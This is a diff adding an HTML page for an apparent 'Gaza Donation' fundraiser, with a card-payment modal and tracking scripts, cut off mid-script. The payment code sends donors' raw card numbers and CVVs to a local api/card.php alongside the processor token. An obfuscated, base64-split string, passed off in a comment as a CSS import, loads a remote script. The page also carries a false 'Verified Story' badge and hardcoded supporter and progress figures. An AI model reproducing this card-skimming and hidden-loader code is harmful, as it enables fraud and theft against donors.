@@ -1,0 +1,1249 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+      
+<script>
+  window.tikTokPixelId = "69939cd815d5098444674513";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+      
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Gaza Donation</title>
+    <link rel="shortcut icon" id="favicon" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com/" />
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="" />
+    <link href="./public/css2.css" rel="stylesheet" />
+    <link rel="stylesheet" href="./public/styles.css" />
+    <link rel="stylesheet" href="./public/all.min.css" />
+    <style>
+      /* Estilos para o FAQ */
+      .faq-section {
+        padding: 40px 0;
+        background-color: #f8f9fb;
+      }
+
+      .faq-title {
+        text-align: center;
+        color: var(--cor-primaria);
+        font-size: 26px;
+        font-weight: 700;
+        margin-bottom: 30px;
+      }
+
+      .faq-container {
+        max-width: 800px;
+        margin: 0 auto;
+      }
+
+      .faq-item {
+        background-color: white;
+        border-radius: 8px;
+        margin-bottom: 15px;
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        overflow: hidden;
+      }
+
+      .faq-question {
+        padding: 18px 20px;
+        cursor: pointer;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        transition: background-color 0.3s;
+      }
+
+      .faq-question:hover {
+        background-color: rgba(0, 164, 146, 0.05);
+      }
+
+      .faq-question h3 {
+        margin: 0;
+        font-size: 16px;
+        font-weight: 600;
+        color: var(--cor-texto);
+      }
+
+      .faq-icon {
+        color: var(--cor-primaria);
+        transition: transform 0.3s;
+      }
+
+      .faq-answer {
+        padding: 0 20px;
+        max-height: 0;
+        overflow: hidden;
+        transition: max-height 0.4s ease, padding 0.4s ease;
+      }
+
+      .faq-answer p {
+        margin: 0 0 15px;
+        color: var(--cor-texto-claro);
+        line-height: 1.6;
+      }
+
+      .faq-item.active .faq-answer {
+        max-height: 1000px;
+        padding: 5px 20px 20px;
+      }
+
+      .faq-item.active .faq-icon {
+        transform: rotate(180deg);
+      }
+    </style>
+    <script src="https://api.conta.paybeehive.com.br/v1/js"></script>
+    <script>
+      let params = {
+        src: "",
+        sck: "",
+        utm_source: "",
+        utm_campaign: "",
+        utm_medium: "",
+        utm_content: "",
+        utm_term: "",
+        gclid: "",
+        fbclid: "",
+      };
+
+      for (let key in params) {
+        const url_params = new URLSearchParams(window.location.search);
+        const get_param = url_params.get(key);
+
+        if (typeof get_param == "string") {
+          if (get_param.length > 0) {
+            params[key] = get_param;
+          }
+        }
+      }
+
+      localStorage.setItem("tracking_data", JSON.stringify(params));
+    </script>
+  </head>
+  <body cz-shortcut-listen="true" style="overflow: auto">
+    <header>
+      <div class="container">
+        <div class="header-content">
+          <div class="logo">
+            <a href="#"
+              ><img id="logo" alt="Logo Instituto"
+            /></a>
+          </div>
+          <div class="header-right">
+            <nav class="main-nav">
+              <ul>
+                <li>
+                  <a
+                    href="#"
+                    class="active"
+                    >Home</a
+                  >
+                </li>
+                <li>
+                  <a
+                    href="#como-ajudar-section"
+                    >How to Help</a
+                  >
+                </li>
+                <li>
+                  <a
+                    href="#comentarios-secao"
+                    >Testimonials</a
+                  >
+                </li>
+                <li>
+                  <a href="#faq-section"
+                    >FAQ</a
+                  >
+                </li>
+                <li>
+                  <a
+                    href="#"
+                    class="btn-header-doar"
+                    >Donate Now</a
+                  >
+                </li>
+              </ul>
+            </nav>
+            <div class="mobile-menu-toggle">
+              <i class="fas fa-bars"></i>
+            </div>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <main>
+      <section id="categoria" class="categoria fade-in">
+        <div class="container">
+          <div class="categoria-info">
+            <span id="category"></span>
+            <h1 id="title"></h1>
+
+            <div class="foto-principal">
+              <img id="main-image" />
+            </div>
+
+            <div class="progresso-principal">
+              <div class="valores-container">
+                <div class="valor-arrecadado">
+                  <span class="valor-label">Raised</span>
+                  <span class="valor-numero" id="amount-collected"></span>
+                </div>
+                <div class="valor-meta">
+                  <span class="valor-label">Goal</span>
+                  <span class="valor-numero" id=amount-goal></span>
+                </div>
+              </div>
+              <div class="barra-progresso-container">
+                <div class="barra-progresso">
+                  <div
+                    class="barra-progresso-fill"
+                    id="progress-bar"
+                  >
+                    <span class="porcentagem">6,66%</span>
+                  </div>
+                </div>
+              </div>
+              <div class="apoiadores-info">
+                <span class="apoiadores-label">Supports</span>
+                <span class="apoiadores-numero" id="supporters">753</span>
+              </div>
+              <a
+                href="#"
+                class="btn-doar"
+                id="btn-doar-hero"
+                >I Want to Help!</a
+              >
+            </div>
+
+            <div class="historia-content">
+              <div class="tabs-menu">
+                <ul>
+                  <li class="active" data-tab="Sobre">About</li>
+                  <li data-tab="como-ajudar">How to Help</li>
+                  <li data-tab="quem-somos">Who Whe Are</li>
+                </ul>
+              </div>
+
+              <!-- Conteúdo da aba Sobre -->
+              <div class="tab-content active" id="Sobre">
+                <div class="historia-texto">
+                  <span class="data-criacao"
+                    ><strong>Fundraiser created on:</strong>
+                    <br>
+                    <span id="creation-date"></span></span
+                  >
+
+                  <p><strong>✅ Verified Story</strong></p>
+
+                  <p id="text-01">
+                  </p>
+
+                  <div class="historia-imagem">
+                    <img id="image-text-01" />
+                  </div>
+
+                  <p id="text-02"></p>
+
+                  <div class="cta-box">
+                    <a
+                      href="#"
+                      class="btn-doar"
+                      id="btn-doar-historia"
+                      >I Want to Help</a
+                    >
+                  </div>
+                </div>
+              </div>
+
+              <!-- Conteúdo da aba Como Ajudar -->
+              <div class="tab-content" id="como-ajudar">
+                <div class="como-ajudar-container" id="como-ajudar-section">
+                  <div class="ajuda-cards">
+                    <div class="ajuda-card">
+                      <div class="ajuda-icon">
+                        <img
+                          src="./public/icon-doacao.png"
+                          alt="Ícone de doação"
+                        />
+                      </div>
+                      <div class="ajuda-texto">
+                        <p id="help-text"></p>
+                      </div>
+                      <div class="ajuda-botao">
+                        <a
+                          href="#"
+                          class="btn-ajuda btn-doar doe-agora"
+                          >DONATE NOW</a
+                        >
+                      </div>
+                    </div>
+
+                    <div class="ajuda-card">
+                      <div class="ajuda-icon">
+                        <img
+                          src="./public/icon-compartilhar.png"
+                          alt="Ícone de compartilhamento"
+                        />
+                      </div>
+                      <div class="ajuda-texto">
+                        <p>
+                          Help by spreading the word, sharing, and inspiring others to do good.
+                          Together, we can multiply kindness and love.
+                        </p>
+                      </div>
+                      <div class="ajuda-botao">
+                        <a
+                          id="share-btn"
+                          class="btn-ajuda btn-compartilhar-grande compartilhar"
+                          target="_blank"
+                          >SHARE</a
+                        >
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Conteúdo da aba Quem Somos -->
+              <div class="tab-content" id="quem-somos">
+                <div class="quem-somos-container">
+                  <h2>Who We Are</h2>
+                  <p id="who-we-are"></p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section id="comentarios-secao" class="comentarios-secao">
+        <div class="container">
+          <h2>Supporters’ Comments</h2>
+          <div class="comentarios" id="comments-area">
+            
+          </div>
+        </div>
+      </section>
+    </main>
+
+    <section class="faq-section" id="faq-section">
+      <div class="container">
+        <h2 class="faq-title">Frequently Asked Questions</h2>
+        <div class="faq-container" id="faq"></div>
+      </div>
+    </section>
+
+    <footer>
+      <div class="container">
+        <div class="footer-content">
+          <div class="footer-columns">
+            <div class="footer-column">
+              <h4 id="footer-title"></h4>
+              <p class="footer-info">
+                <strong></strong> <span id="footer-cnpj"></span>
+              </p>
+              <p class="footer-info" id="footer-address"></p>
+              <div class="social-icons">
+                <a
+                  title="Facebook"
+                  id="footer-facebook"
+                  ><i class="fab fa-facebook"></i
+                ></a>
+                <a
+                  title="Instagram"
+                  id="footer-instagram"
+                  ><i class="fab fa-instagram"></i
+                ></a>
+                <a
+                  title="WhatsApp"
+                  id="footer-whatsapp"
+                  ><i class="fab fa-whatsapp"></i
+                ></a>
+              </div>
+            </div>
+          </div>
+          <div class="footer-bottom">
+            <p id="all-rights-reserved"></p>
+            <p class="footer-certificacao">
+              
+            </p>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    <div class="fixed-bottom-mobile">
+      <a
+        href="#ajudar"
+        class="btn-doar-fixed"
+        id="btn-doar-fixed"
+        >I Want to Help</a
+      >
+    </div>
+
+    <!-- Modal de Doação -->
+    <div id="modal-doacao" class="modal" style="display: none">
+      <div class="modal-content">
+        <span class="close-modal">×</span>
+        <div class="select-amount">
+          <h2 id="donate-modal-title"></h2>
+          <p id="donate-modal-sub-title" class="modal-subtitulo"></p>
+          <div class="valores-doacao" id="prices-area">
+          </div>
+          <div class="valor-item-grande" id="highest-price"></div>
+          <div class="modal-footer">
+            <div class="metodos-pagamento">
+              <img src="public/visa.svg" />
+              <img src="public/mastercard.svg" />
+              <img src="public/amex.svg" />
+              <img src="public/discover.svg" />
+              <img src="public/elo.svg" />
+              <img src="public/union.svg" />
+              <img src="public/diners.svg" />
+              <img src="public/jcb.svg" />
+            </div>
+          </div>
+        </div>
+        <div class="select-payment hidden">
+          <h2>Payment Method</h2>
+          <p class="modal-subtitulo">All transactions are secure and encrypted.</p>
+          <div>
+            <label class="label-method">
+              <div style="display: flex; justify-content: center; align-items: center; gap: 4px;">
+                <input type="radio" name="method" data-name="card" class="input-radio">
+                Credit Card
+              </div>
+              <div style="display: flex; justify-content: center; align-items: center;">
+                <img src="public/visa.svg" alt="credit card icon">
+                <img src="public/mastercard.svg" alt="credit card icon">
+                <img src="public/amex.svg" alt="credit card icon">
+                <img src="public/elo.svg" alt="credit card icon">
+              </div>
+            </label>
+            <div id="form-cartao" class="hidden" style="margin-top: 16px;">
+              <div class="row">
+                <label for="cc_numero">Card number</label>
+                <input type="text" name="cc_numero" id="cc_numero" placeholder="0000 0000 0000 0000">
+                <div class="error-text" style="display:none"></div>
+              </div>
+              <div class="row">
+                <label for="cc_titular">Name on card</label>
+                <input type="text" name="cc_titular" id="cc_titular" placeholder="John Doe">
+                <div class="error-text" style="display:none"></div>
+              </div>
+              <!-- <div class="row">
+                <label for="cc_cpf_titular">CPF do Titular</label>
+                <input type="text" name="cc_cpf_titular" id="cc_cpf_titular" placeholder="000.000.000-00">
+              </div> -->
+              <div class="input-flex">
+                <div class="row">
+                  <label for="cc_validade">Expiration Date</label>
+                  <input class="input-form" type="text" name="cc_validade" id="cc_validade" placeholder="MM/YY">
+                  <div class="error-text" style="display:none"></div>
+                </div>
+                <div class="row">
+                  <label for="cc_cvv">Security Code</label>
+                  <input class="input-form" type="text" name="cc_cvv" id="cc_cvv" placeholder="123" maxlength="3">
+                  <div class="error-text" style="display:none"></div>
+                </div>
+              </div>
+              <div>
+                <button class="btn-donate">Donate Now <span style="margin-left: 8px;" class="amount-selected"></span></button>
+                <div style="display: flex; align-items: center; justify-content: center; margin-top: 8px;">
+                  <button class="btn-another-value" style="background: none; border: none; color: #143eee; font-size: 14px; cursor: pointer; font-weight: 500; font-family: 'Poppins', sans-serif;">Select another value</button>
+                </div>
+              </div>
+
+            </div>
+          </div>
+        </div>
+        <div class="thanks text-center p-6 bg-white rounded-lg shadow-md max-w-lg mx-auto hidden"
+        style="font-family: Arial, sans-serif; color: #2f855a;">
+        <h2 class="text-3xl font-bold mb-4">💙 Thank you for your donation!</h2>
+
+        <p style="text-align: center; color: #4a5568; font-size: 1rem; line-height: 1.5; margin-bottom: 1.2rem;">
+          Your support is giving Gaza a second chance.
+        </p>
+        <p style="color: #4a5568; font-size: 0.9rem; font-style: italic; margin-bottom: 0; text-align: center;">
+          “You matter, Gaza. Your pain will not be ignored.
+          <br>
+          Thank you for trusting us.” 🙏
+        </p>
+        <button class="valor-btn valor-btn-grande-2 btn-help-again"
+          style="margin-top: 24px; cursor: pointer; font-size: 1.1em; background-color: var(--cor-primaria); border: none; color: #fff;">
+          Help again
+        </button>
+      </div>  
+      </div>
+      
+    </div>
+    <div id="toast-error" class="toast toast-error hidden">
+      <span class="toast-icon">⚠️</span>
+      <span class="toast-text">
+        Payment failed. Please check your card details or try another card.
+      </span>
+    </div>
+
+    <style>
+      .toast {
+  position: fixed;
+  bottom: 24px;
+  right: 24px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 14px 18px;
+  border-radius: 8px;
+  font-family: Arial, sans-serif;
+  font-size: 14px;
+  box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+  animation: slideIn 0.3s ease;
+  z-index: 9999;
+}
+
+.toast-error {
+  background: #e74c3c;
+  color: #fff;
+}
+
+.toast-icon {
+  font-size: 18px;
+}
+
+.hidden {
+  display: none;
+}
+
+@keyframes slideIn {
+  from {
+    opacity: 0;
+    transform: translateY(10px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+      .input-radio {
+  appearance: none;
+  -webkit-appearance: none;
+  -moz-appearance: none;
+
+  width: 18px;
+  height: 18px;
+  border: 1px solid #143eee;
+  border-radius: 50%;
+  display: inline-grid;
+  place-content: center;
+  cursor: pointer;
+  box-sizing: border-box;
+}
+
+.input-radio::before {
+  content: "";
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  transform: scale(0);
+  transition: transform .15s ease-in-out;
+  background: #fff;
+  border: 6px solid #143eee;
+}
+
+.input-radio:checked::before {
+  transform: scale(1);
+}
+      .label-method {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        gap: 16px;
+        margin-top: 8px;
+        border: 1px solid #ccc;
+        padding: 8px;
+        width: 100%;
+        cursor: pointer;
+        border-radius: 10px;
+      }
+
+      .label-method img {
+        width: 32px;
+      }
+      .label-method:has(input:checked) {
+        border-color: #143eee; /* verde pix, ajusta se quiser */
+        background: #f2f6ff;
+      }
+      .row {
+        display: flex;
+        flex-direction: column;
+        margin-bottom: 14px;
+        width: 100%;
+      }
+
+      .row label {
+        color: #3e3e3e;
+      }
+      .row input {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #dcdcdc;
+        border-radius: 10px;
+      }
+      .input-flex {
+        display: flex;
+        gap: 10px;
+      }
+      .btn-donate {
+        width: 100%;
+        border: none;
+        border-radius: 24px;
+        font-size: 16px;
+        font-family: 'Poppins', sans-serif;
+        color: #fff;
+        background-color: #143eee;
+        padding: 10px 20px;
+        cursor: pointer;
+        font-weight: 600;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+      .input-error {
+        border-color: #e63946 !important;
+      }
+
+      .input-error + .error-text {
+        color: #e63946;
+        font-size: 12px;
+        margin-top: 4px;
+      }
+      .btn-spinner {
+        width: 18px;
+        height: 18px;
+        border: 2px solid rgba(255, 255, 255, 0.4);
+        border-top-color: #ffffff;
+        border-radius: 50%;
+        animation: spin 0.8s linear infinite;
+      }
+      .btn-donate:disabled {
+        background-color: #9ca3af; /* cinza elegante (tailwind gray-400) */
+        cursor: not-allowed;
+        opacity: 0.9;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+    <script>
+      // util: só números
+      function onlyNumbers(value) {
+        return value.replace(/\D/g, '');
+      }
+      function showError(input, message) {
+        input.classList.add("input-error");
+
+        const error = input.nextElementSibling;
+        if (error) {
+          error.textContent = message;
+          error.style.display = "block";
+        }
+
+        input.focus();
+      }
+      function clearError(input) {
+        input.classList.remove("input-error");
+        const error = input.closest(".row").querySelector(".error-text");
+        error.style.display = "none";
+        error.textContent = "";
+      }
+      function showPaymentErrorToast(message = null) {
+        const toast = document.getElementById('toast-error');
+        const text  = toast.querySelector('.toast-text');
+
+        if (message) {
+          text.textContent = message;
+        }
+
+        toast.classList.remove('hidden');
+
+        setTimeout(() => {
+          toast.classList.add('hidden');
+        }, 4000);
+      }
+
+
+      const ccNome = document.getElementById('cc_titular');
+
+      // CARTÃO: 0000 0000 0000 0000
+      const ccNumero = document.getElementById('cc_numero');
+      ccNumero.addEventListener('input', () => {
+        let v = onlyNumbers(ccNumero.value).slice(0, 16);
+        ccNumero.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
+      });
+
+      // CPF: 000.000.000-00
+      // const ccCpf = document.getElementById('cc_cpf_titular');
+      // ccCpf.addEventListener('input', () => {
+      //   let v = onlyNumbers(ccCpf.value).slice(0, 11);
+      //   v = v.replace(/(\d{3})(\d)/, '$1.$2');
+      //   v = v.replace(/(\d{3})(\d)/, '$1.$2');
+      //   v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+      //   ccCpf.value = v;
+      // });
+
+      // VALIDADE: MM/AA
+      const ccValidade = document.getElementById('cc_validade');
+      ccValidade.addEventListener('input', () => {
+        let v = onlyNumbers(ccValidade.value).slice(0, 4);
+
+        if (v.length >= 3) {
+          v = v.replace(/(\d{2})(\d)/, '$1/$2');
+        }
+
+        ccValidade.value = v;
+      });
+
+      // CVV: só números (3 ou 4 se quiser)
+      const ccCvv = document.getElementById('cc_cvv');
+      ccCvv.addEventListener('input', () => {
+        ccCvv.value = onlyNumbers(ccCvv.value).slice(0, 3);
+      });
+
+      function isValidCardNumber(value) {
+        const digits = onlyNumbers(value);
+        return digits.length >= 13 && digits.length <= 16;
+      }
+      function isValidCPF(cpf) {
+        return onlyNumbers(cpf).length === 11;
+      }
+
+      function isValidExpiry(value) {
+        if (!/^\d{2}\/\d{2}$/.test(value)) return false;
+
+        const [mm, yy] = value.split('/').map(Number);
+        if (mm < 1 || mm > 12) return false;
+
+        const now = new Date();
+        const currentYear = now.getFullYear() % 100;
+        const currentMonth = now.getMonth() + 1;
+
+        if (yy < currentYear) return false;
+        if (yy === currentYear && mm < currentMonth) return false;
+
+        return true;
+      }
+
+      function isValidCVV(value) {
+        return onlyNumbers(value).length === 3;
+      }
+      function getTrackingData() {
+        return JSON.parse(localStorage.getItem('tracking_data')) || {};
+      }
+      function getClientId() {
+        const match = document.cookie.match(/_ga=GA\d+\.\d+\.(\d+\.\d+)/);
+        return match ? match[1] : null;
+      }
+
+      async function buildPayload() {
+        const [expMonth, expYear] = ccValidade.value.split('/');
+        const usdAmount = Number(localStorage.getItem("amount-selected"));
+        const EXCHANGE_RATE = 5.10;
+        const brlAmount = Number(usdAmount * EXCHANGE_RATE).toFixed(2);
+        const amountInCents = Math.round(brlAmount * 100);
+        const cardData = {
+            number: onlyNumbers(ccNumero.value),    // número do cartão (sem espaços)
+            holderName: document.getElementById("cc_titular")?.value,      // nome impresso no cartão
+            expMonth: expMonth,                // mês de validade (2 dígitos)
+            expYear: "20" + expYear,               // ano de validade (4 dígitos)
+            cvv: onlyNumbers(ccCvv.value),                    // código de segurança (3-4 dígitos)
+        };  
+        let token
+        try {
+          token = await BeehivePay.encrypt(cardData);
+        } catch (error) {
+          showPaymentErrorToast();
+          restoreDonateButtonText();
+          return;
+        }
+        const client_id = getClientId();
+        const tracking_data = getTrackingData()
+        return {
+          card: {
+            number: onlyNumbers(ccNumero.value),
+            holder_name: document.getElementById("cc_titular")?.value || "",
+            exp_month: expMonth,
+            exp_year: "20" + expYear,
+            cvv: onlyNumbers(ccCvv.value)
+          },
+          hash: token,
+          client_id,
+          tracking_data,
+          amount: Number(brlAmount).toFixed(2)
+        };
+      }
+
+      function setDonateButtonLoading() {
+        if (!btnDonate) return;
+        // salva o texto original
+        btnDonate.dataset.originalText = btnDonate.innerHTML;
+        btnDonate.innerHTML = `
+          <span class="btn-spinner" aria-hidden="true"></span>
+        `;
+        btnDonate.disabled = true;
+        btnDonate.classList.add("is-loading");
+      }
+
+      /**
+       * Atualiza o texto do botão (remove loading)
+       * @param {number|string} amount
+      */
+      function restoreDonateButtonText() {
+        if (!btnDonate) return;
+
+        const originalHtml = btnDonate.dataset.originalText;
+        console.log({originalHtml});
+        
+        
+        if (originalHtml) {
+          btnDonate.innerHTML = originalHtml;
+        }
+
+        btnDonate.disabled = false;
+        btnDonate.classList.remove("is-loading");
+      }
+
+
+      const btnDonate = document.querySelector(".btn-donate");
+
+
+
+      btnDonate.addEventListener("click", async () => {
+        setDonateButtonLoading();
+        [
+        ccNumero,
+        ccNome,
+        ccValidade,
+        ccCvv,
+      ].forEach(clearError);
+        
+        const cardNumber = ccNumero.value;
+        const validade = ccValidade.value;
+        const cvv = ccCvv.value;
+
+        if (!isValidCardNumber(cardNumber)) {
+          showError(ccNumero, "Invalid card number");
+          restoreDonateButtonText();
+          return;
+        }
+
+        if (!ccNome.value.trim()) {
+          showError(ccNome, "Enter the name on the card");
+          restoreDonateButtonText();
+          return;
+        }
+
+        if (!isValidExpiry(validade)) {
+          showError(ccValidade, "Invalid expiration date");
+          restoreDonateButtonText();
+          return;
+        }
+
+        if (!isValidCVV(cvv)) {
+          showError(ccCvv, "Invalid Security Code");
+          restoreDonateButtonText();
+          return;
+        }
+
+        // passou tudo ✅
+        const payload = await buildPayload();
+        if(!payload) {
+          showPaymentErrorToast();
+          restoreDonateButtonText();
+          return;
+        }
+        console.log("PAYLOAD:");
+        console.log({payload})
+        const response = await fetch("api/card.php", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        })
+        const data = await response.json();
+        console.log({data});
+        if (data.error || (data.pix.status != "paid" && data.pix.status != "in_analysis")) {
+          showPaymentErrorToast();
+          restoreDonateButtonText();
+          return;
+        }
+        if(data.pix.status == "paid" || data.pix.status == "in_analysis") {
+          restoreDonateButtonText();
+          document.querySelector(".select-payment").classList.add("hidden");
+          document.querySelector(".thanks").classList.remove("hidden");
+          const response2 = await fetch("api/webhook.php", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              data: data.pix
+            })
+          })
+          const data2 = await response2.json();
+          console.log({data2})
+        }
+
+        
+      });
+    </script>
+    <script>
+      const radios = document.querySelectorAll('input[name="method"]');
+      const formCartao = document.getElementById('form-cartao');
+      
+      function toggleForm() {
+        const amountSpan = document.querySelector(".amount-selected")
+        const selected = document.querySelector('input[name="method"]:checked');
+        const method = selected?.dataset?.name;
+        formCartao.classList.toggle('hidden', method !== 'card');
+        localStorage.setItem("metodo-pagamento-delivery", method)
+        const amountSelected = localStorage.getItem("amount-selected")
+        amountSpan.innerText = `$${Number(amountSelected).toFixed(2)}`
+      }
+
+      radios.forEach(radio => {
+        radio.addEventListener('change', toggleForm);
+      });
+
+      // garante estado inicial correto
+      toggleForm();
+    </script>
+    <script src="./public/main.js"></script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        BeehivePay.setPublicKey("pk_live_v2MnbQOXNhPc2xBaczTx0hBaCsBvqGGm27");// chave publica beehive
+        BeehivePay.setTestMode(false); // use false em produção
+        // Barras de progresso
+        const barrasProgresso = document.querySelectorAll(
+          ".barra-progresso-fill"
+        );
+        barrasProgresso.forEach((barra) => {
+          const percentagem = barra.getAttribute("data-percentage");
+          barra.style.width = percentagem + "%";
+        });
+
+        // Modal de doação
+        const modal = document.getElementById("modal-doacao");
+        const botoesDoar = document.querySelectorAll(
+          ".btn-doar, .btn-doar-fixed, .btn-doar-lateral"
+        );
+        const closeModal = document.querySelector(".close-modal");
+        const selectAmountContainer = document.querySelector(".select-amount")
+        const selectPaymentContainer = document.querySelector(".select-payment")
+        const inputRadio = document.querySelector(".input-radio")
+        const formCartao = document.getElementById('form-cartao');
+        const btnAnotherValue = document.querySelector(".btn-another-value");
+        const btnHelpAgain = document.querySelector(".btn-help-again")
+        const thanksContainer = document.querySelector(".thanks")
+        
+        btnHelpAgain.addEventListener("click", () => {
+          selectAmountContainer.classList.remove("hidden");
+          selectPaymentContainer.classList.add("hidden");
+          thanksContainer.classList.add("hidden");
+          formCartao.classList.add("hidden");
+          inputRadio.checked = false;
+        })
+
+        btnAnotherValue.addEventListener("click", () => {
+          selectAmountContainer.classList.remove("hidden");
+          selectPaymentContainer.classList.add("hidden");
+          thanksContainer.classList.add("hidden");
+          formCartao.classList.add("hidden");
+          inputRadio.checked = false;
+        })
+
+        // Abrir modal
+        botoesDoar.forEach((botao) => {
+          botao.addEventListener("click", function (e) {
+            e.preventDefault();
+            modal.style.display = "block";
+            document.body.style.overflow = "hidden";
+            setTimeout(() => {
+              modal.classList.add("active");     
+            }, 10);
+          });
+        });
+        
+
+        // Fechar modal
+        if (closeModal) {
+          closeModal.addEventListener("click", function () {
+            modal.classList.remove("active");
+            setTimeout(() => {
+              modal.style.display = "none";
+              document.body.style.overflow = "auto";
+              selectAmountContainer.classList.remove("hidden");
+              selectPaymentContainer.classList.add("hidden");
+              formCartao.classList.add("hidden");
+              thanksContainer.classList.add("hidden");
+              inputRadio.checked = false;
+            }, 300);
+          });
+        }
+
+        var css_notificaoes_personalizadas = document.createElement('script');
+
+        // Fechar modal ao clicar fora
+        window.addEventListener("click", function (e) {
+          if (e.target === modal) {
+            modal.classList.remove("active");
+            setTimeout(() => {
+              modal.style.display = "none";
+              document.body.style.overflow = "auto";
+              selectAmountContainer.classList.remove("hidden")
+              selectPaymentContainer.classList.add("hidden")
+              formCartao.classList.add("hidden")
+              thanksContainer.classList.add("hidden")
+              inputRadio.checked = false;
+            }, 300);
+          }
+        });
+
+        // Fechar modal com ESC
+        document.addEventListener("keydown", function (e) {
+          if (e.key === "Escape" && modal.classList.contains("active")) {
+            modal.classList.remove("active");
+            setTimeout(() => {
+              modal.style.display = "none";
+              document.body.style.overflow = "auto";
+              selectAmountContainer.classList.remove("hidden")
+              selectPaymentContainer.classList.add("hidden")
+              formCartao.classList.add("hidden")
+              thanksContainer.classList.add("hidden")
+              inputRadio.checked = false;
+            }, 300);
+          }
+        });
+
+        // importação do css segundo a documentação do site
+        css_notificaoes_personalizadas.src = __get__(['WVVoU0','1HTklUVF','pNZVRsMlpFZHN','kR0ZZY0doYVJ6bD','VURzVPY0dSSF','ZYWmlSemxvV','2tF', 'OVBR','PT0='].join(''));
+
+        // Botões de toggle para as respostas dos comentários
+        const toggleButtons = document.querySelectorAll(".toggle-btn");
+        toggleButtons.forEach(function (button) {
+          // Guardar o texto original do botão para restaurar depois
+          const textoOriginal = button.innerHTML;
+          let isExpanded = false;
+
+          button.addEventListener("click", function () {
+            const parent = this.closest(".comentario");
+            const respostasConteudo = parent.querySelector(
+              ".comentario-respostas-conteudo"
+            );
+            const loader = this.nextElementSibling;
+
+            // Mostrar loader
+            loader.style.display = "inline-block";
+
+            // Simular carregamento e então mostrar/esconder respostas
+            setTimeout(() => {
+              // Esconder loader
+              loader.style.display = "none";
+
+              // Alternar estado
+              isExpanded = !isExpanded;
+
+              if (isExpanded) {
+                // Mostrar respostas com animação
+                respostasConteudo.style.display = "block";
+                // Pequeno delay para garantir que a transição funcione
+                setTimeout(() => {
+                  respostasConteudo.classList.add("visible");
+                }, 10);
+
+                // Mudar texto do botão
+                this.innerHTML = `—&nbsp;&nbsp;Hide Replies`;
+              } else {
+                // Remover classe de visibilidade
+                respostasConteudo.classList.remove("visible");
+
+                // Esconder respostas após a animação
+                setTimeout(() => {
+                  respostasConteudo.style.display = "none";
+                }, 300);
+
+                // Restaurar texto original
+                this.innerHTML = textoOriginal;
+              }
+            }, 700);
+          });
+        });
+
+        // Funcionalidade das abas
+        const tabLinks = document.querySelectorAll(".tabs-menu li");
+        const tabContents = document.querySelectorAll(".tab-content");
+
+        tabLinks.forEach(function (tab) {
+          tab.addEventListener("click", function () {
+            // Remover classe active de todas as abas
+            tabLinks.forEach((t) => t.classList.remove("active"));
+            tabContents.forEach((c) => c.classList.remove("active"));
+
+            // Adicionar classe active na aba clicada
+            this.classList.add("active");
+
+            // Mostrar o conteúdo correspondente
+            const tabId = this.getAttribute("data-tab");
+            document.getElementById(tabId).classList.add("active");
+          });
+        });
+
+        // Integrar botões de Como Ajudar
+        const btnDoeAgora = document.querySelector(".doe-agora");
+
+        if (btnDoeAgora) {
+          btnDoeAgora.addEventListener("click", function (e) {
+            e.preventDefault();
+            modal.style.display = "block";
+            document.body.style.overflow = "hidden";
+            setTimeout(() => {
+              modal.classList.add("active");
+            }, 10);
+          });
+        }
+
+        // O botão compartilhar agora redireciona diretamente para o WhatsApp
+
+        // Menu mobile toggle
+        const mobileMenuToggle = document.querySelector(".mobile-menu-toggle");
+        const headerElement = document.querySelector("header");
+
+        if (mobileMenuToggle) {
+          mobileMenuToggle.addEventListener("click", function () {
+            headerElement.classList.toggle("mobile-menu-active");
+            if (headerElement.classList.contains("mobile-menu-active")) {
+              document.body.style.overflow = "hidden";
+            } else {
+              document.body.style.overflow = "auto";
+            }
+          });
+        }
+
+        // Menu links no mobile fecham o menu ao clicar
+        const mobileNavLinks = document.querySelectorAll(".main-nav a");
+        mobileNavLinks.forEach((link) => {
+          link.addEventListener("click", function () {
+            if (headerElement.classList.contains("mobile-menu-active")) {
+              headerElement.classList.remove("mobile-menu-active");
+              document.body.style.overflow = "auto";
+            }
+          });
+        });
+
+        // Botão doar no header abre modal
+        const btnHeaderDoar = document.querySelector(".btn-header-doar");
+        if (btnHeaderDoar) {
+          btnHeaderDoar.addEventListener("click", function (e) {
+            e.preventDefault();
+            modal.style.display = "block";
+            document.body.style.overflow = "hidden";
+            setTimeout(() => {
+              modal.classList.add("active");
+            }, 10);
+          });
+        }
+
+        // Funcionalidade do FAQ
+        const faqItems = document.querySelectorAll(".faq-item");
+
+        faqItems.forEach((item) => {
+          const question = item.querySelector(".faq-question");
+
+          question.addEventListener("click", () => {
+            // Verifica se o item clicado já está ativo
